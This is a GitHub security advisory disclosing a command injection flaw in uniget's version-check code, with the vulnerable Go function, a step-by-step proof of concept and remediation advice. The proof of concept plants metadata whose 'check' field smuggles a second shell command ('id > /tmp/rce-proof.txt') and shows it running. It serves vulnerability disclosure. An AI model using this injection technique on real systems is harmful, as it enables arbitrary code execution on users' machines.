# [H] uniget is Vulnerable to Command Injection in tool.Check Leading to Arbitrary Code Execution

## Summary
Severity: High
Advisory: GHSA-qqq4-5773-pmw5
CVE: CVE-2026-45152
CWE: CWE-78
Ecosystem: Go
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-13
Source: https://github.com/advisories/GHSA-qqq4-5773-pmw5
Type: github-advisory

## Affected
- Go: `gitlab.com/uniget-org/cli` — affected >=0 <0.27.1

## Details
I discovered a command injection vulnerability in uniget that allows arbitrary command execution through the metadata loading and version check mechanism.

### Summary

A command injection vulnerability exists in uniget due to unsafe execution of the `check` field from metadata files using `/bin/bash -c`. Because the `check` field is loaded directly from untrusted JSON metadata without validation or sanitization, an attacker can craft malicious metadata that executes arbitrary shell commands on the victim’s system when common uniget operations such as `describe`, `install`, `update`, or `inspect` are performed.

This vulnerability can lead to arbitrary code execution with the privileges of the user running uniget.

### Details

The vulnerable code is located in:

`tool.go:250`

Vulnerable function:

```go id="f2g0ic"
func (tool *Tool) RunVersionCheck() (string, error) {
    cmd := exec.Command("/bin/bash", "-c", tool.Check+" | tr -d '\n'")
    version, err := cmd.Output()
    return string(version), nil
}
```

The issue occurs because the `tool.Check` field is populated directly from metadata JSON files without validation.

Related structure:

```go id="7f4yzm"
type Tool struct {
    Check string
}
```

Metadata loading uses `json.Unmarshal()` to populate the `Tool` struct directly from JSON metadata, allowing attacker-controlled input to reach the shell execution sink.

Because `/bin/bash -c` is used, shell metacharacters such as `;`, `&&`, `|`, `$()`, and backticks are interpreted by the shell, enabling arbitrary command injection.

### PoC

Step 1 — Verify the vulnerable binary:

```bash id="7k3d07"
/tmp/uniget-bin --version
```

Output:

```text id="p2gk9z"
uniget version main
```

Step 2 — Create malicious metadata cache:

```bash id="j5zpr0"
mkdir -p ~/.local/var/cache/uniget

cat > ~/.local/var/cache/uniget/metadata.json << 'EOF'
{
  "tools": [
    {
      "name": "evil-tool",
      "version": "1.0.0",
      "binary": "${target}/bin/evil-tool",
      "check": "echo '1.0.0'; id > /tmp/rce-proof.txt",
      "tags": ["test"],
      "description": "RCE test",
      "repository": "https://example.com",
      "license": {
        "name": "MIT",
        "link": "https://example.com"
      },
      "sources": [
        {
          "registry": "ghcr.io",
          "repository": "uniget-org/tools"
        }
      ]
    }
  ]
}
EOF
```

Step 3 — Create placeholder binary:

```bash id="53ml7u"
mkdir -p ~/.local/usr/local/bin

cat > ~/.local/usr/local/bin/evil-tool << 'EOF'
#!/bin/bash
echo "placeholder"
EOF

chmod +x ~/.local/usr/local/bin/evil-tool
```

Step 4 — Trigger the vulnerable workflow:

```bash id="w4j7h4"
/tmp/uniget-bin describe evil-tool --prefix ~/.local
```

Application output:

```text id="q0k54m"
Name: evil-tool
  Description: RCE test
  Repository: https://example.com
  Version: 1.0.0
  Check: <echo '1.0.0'; id > /tmp/rce-proof.txt>
```

Step 5 — Verify arbitrary command execution:

```bash id="w7r8z3"
ls -la /tmp/rce-proof.txt
cat /tmp/rce-proof.txt
```

Actual output:

```bash id="6plm7v"
-rw-rw-r-- 1 w4nn4d13 w4nn4d13 253 May 7 23:53 /tmp/rce-proof.txt

uid=1000(w4nn4d13) gid=1000(w4nn4d13) groups=1000(w4nn4d13),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),102(scanner),106(bluetooth),108(lpadmin),112(kaboxer),113(wireshark),128(docker)
```

<img width="1107" height="694" alt="image" src="https://github.com/user-attachments/assets/857dbec9-9e51-4676-bf90-e529ad23b9a7" />

<img width="1909" height="631" alt="image" src="https://github.com/user-attachments/assets/f4a1bac2-634e-4f67-91cb-c8684f442b4e" />


This confirms arbitrary command execution through the untrusted `check` field loaded from metadata.

### Impact

This issue allows arbitrary command execution on systems running uniget when processing malicious metadata.

An attacker may be able to:

* Execute arbitrary shell commands
* Exfiltrate sensitive files or environment variables
* Install malware or backdoors
* Modify or delete accessible files
* Establish persistence on the victim machine
* Compromise CI/CD environments using uniget automation

Any user importing or processing attacker-controlled metadata may be impacted.

### Suggested Remediation

Avoid using `/bin/bash -c` with untrusted input.

Instead of:

```go id="ntxjlwm"
exec.Command("/bin/bash", "-c", tool.Check+" | tr -d '\n'")
```

consider executing fixed binaries and arguments directly without invoking a shell.

For example:

```go id="ngbkk2"
exec.Command(binary, "--version")
```

or sanitize and strictly validate allowed commands before execution.

Thank you for your time and for maintaining the project. Please let me know if you need any additional information or a more detailed proof of concept.

## References
- https://github.com/uniget-org/cli/security/advisories/GHSA-qqq4-5773-pmw5
- https://nvd.nist.gov/vuln/detail/CVE-2026-45152
- https://github.com/uniget-org/cli
- https://github.com/uniget-org/cli/releases/tag/v0.27.1
